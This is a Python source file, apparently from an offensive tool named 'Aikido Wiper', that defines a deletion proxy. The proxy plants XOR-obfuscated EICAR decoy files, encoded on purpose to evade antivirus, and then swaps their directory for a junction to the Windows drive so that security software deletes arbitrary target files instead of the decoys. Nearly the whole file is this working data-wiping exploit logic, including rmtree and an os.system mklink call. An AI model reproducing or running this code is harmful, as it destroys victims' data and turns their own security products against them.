import os
import tempfile
import uuid
import shutil
import pathlib
import progressbar
from typing import Iterable
from abc import abstractmethod

from aikido_wiper.indirect_ops.delete.idelete_proxy import IDeleteProxy

class DecoyPath(object):
    """
    Represents a specially crafted path to a decoy file that is used in order to delete
    a target path with the JunctionSwitchDeleteProxy
    """

    def __init__(self, decoy_dir, path_to_delete) -> None:
        """
        Creates the decoy_path based on the target path to delete.

        :param decoy_dir: The parent folder for the decoy path.
        :param path_to_delete: The target file to delete with the decoy.
        """
        self.path_to_delete = path_to_delete
        abs_path_to_delete = os.path.abspath(path_to_delete)
        drive, path_to_delete_without_drive = os.path.splitdrive(abs_path_to_delete)
        path_to_delete_without_drive = path_to_delete_without_drive[1:]
        
        self.decoy_dir = decoy_dir
        self.decoy_deepest_dir = os.path.join(self.decoy_dir, os.path.dirname(path_to_delete_without_drive))

        try:
            os.makedirs(self.decoy_deepest_dir)
        except FileExistsError:
            pass


class JunctionSwitchDeleteProxy(IDeleteProxy):
    """
    A deletion proxy that sets a decoy for another running entity that has interest
    in deleting the decoy. Next, switches the root decoy path to a junction so the
    other running entity accidentally deletes the target path.
    """

    # An EICAR file content XORed with 0x7F so it won't trigger an anti virus.
    ENCODED_EICAR = [
    0x27, 0x4A, 0x30, 0x5E, 0x2F, 0x5A, 0x3F, 0x3E, 0x2F, 0x24, 0x4B, 0x23, 0x2F, 0x25, 0x27, 0x4A,
    0x4B, 0x57, 0x2F, 0x21, 0x56, 0x48, 0x3C, 0x3C, 0x56, 0x48, 0x02, 0x5B, 0x3A, 0x36, 0x3C, 0x3E,
    0x2D, 0x52, 0x2C, 0x2B, 0x3E, 0x31, 0x3B, 0x3E, 0x2D, 0x3B, 0x52, 0x3E, 0x31, 0x2B, 0x36, 0x29,
    0x36, 0x2D, 0x2A, 0x2C, 0x52, 0x2B, 0x3A, 0x2C, 0x2B, 0x52, 0x39, 0x36, 0x33, 0x3A, 0x5E, 0x5B,
    0x37, 0x54, 0x37, 0x55
    ]

    EICAR_XOR_DECODING_KEY = 0x7F

    def __init__(self, use_one_junction_dir: bool, decoy_dir_path: str = None) -> None:
        """
        Creates a junction switch deletion proxy.

        :param use_one_junction_dir: If True, the proxy will create all the decoys under
            the same dir which will later be switched to be a junction.
        :param decoy_dir_path: Optional, The path that will contain the decoy paths with the
            decoys inside. It is recommended that the path to this directory will be as short
            as possible (for example: "C:\A"). Windows has a path length limit so this will
            help the proxy achieve better deletion results. If not given, the path will be
            a directory with a UUID name inside the windows drive.
        """
        self._use_one_junction_dir = use_one_junction_dir
        self._windows_drive = pathlib.Path.home().drive + "\\"
        self._decoys_root_dir_path = decoy_dir_path
        if None == self._decoys_root_dir_path or "" == self._decoys_root_dir_path:
            self._decoys_root_dir_path = os.path.join(self._windows_drive, str(uuid.uuid4()))
        self._decoy_dir_count = 0

    def indirect_delete_paths(self, paths_to_delete: Iterable[str]) -> set[str]:
        """
        Read parent class doc
        """
        decoy_path_set = set()
        failed_targets = set()
        decoy_dir = self._decoys_root_dir_path

        # For each deletion target, create a decoy path and the decoy itself.
        # Also save the deletion targets that a decoy was not successfully created for.
        for path_to_delete in progressbar.progressbar(paths_to_delete):
            if not self._use_one_junction_dir:
                decoy_dir = os.path.join(self._decoys_root_dir_path, str(self._decoy_dir_count))

            try:
                decoy_path = DecoyPath(decoy_dir, path_to_delete)
                self._create_decoy_file(decoy_path)
            except:
                failed_targets.add(path_to_delete)
                continue

            decoy_path_set.add(decoy_path)
        
        if len(failed_targets) == len(paths_to_delete):
            raise RuntimeError("Could not delete any of the targets")

        for decoy_path in decoy_path_set:
            self._before_junction_switch(decoy_path)

        if self._use_one_junction_dir:
            junction_switch_paths = {self._decoys_root_dir_path}
        else:
            junction_switch_paths = {decoy_path.decoy_dir for decoy_path in decoy_path_set}
        
        for junction_switch_path in junction_switch_paths:
            self._switch_to_junction(junction_switch_path)
        
        for decoy_path in decoy_path_set:
            self._after_junction_switch(decoy_path)

        return failed_targets

    def _switch_to_junction(self, link_path: str):
        """
        Deletes a directory and whatever inside and then creates a junction with the same
        name that points to the Windows drive.

        :param link_path: The directory to delete.
        """
        shutil.rmtree(link_path)
        os.system(f"mklink /J {link_path} {self._windows_drive} > nul 2>&1")

    def _get_decoded_eicar(self) -> bytearray:
        """
        Retrieves the decoded EICAR file content from the encoded one.

        :return: EICAR file content
        """
        decoded_eicar = bytearray()
        for byte in self.ENCODED_EICAR:
            decoded_eicar.append(byte ^ self.EICAR_XOR_DECODING_KEY)

        return decoded_eicar

    @abstractmethod
    def _create_decoy_file(self, decoy_path: DecoyPath) -> None:
        """
        Creates the decoy file that should lead to the deletion of the target path to delete.

        :param decoy_path: The relevant decoy path.
        """
        raise NotImplementedError()

    @abstractmethod
    def _before_junction_switch(self, decoy_path: DecoyPath) -> None:
        """
        A callback which happens just before the junction switch for each target path
        to delete.

        :param decoy_path: The relevant decoy path.
        """
        raise NotImplementedError()

    @abstractmethod
    def _after_junction_switch(self, decoy_path: DecoyPath) -> None:
        """
        A callback which happens right after the junction switch for each target path
        to delete.

        :param decoy_path: The relevant decoy path
        """
        raise NotImplementedError()

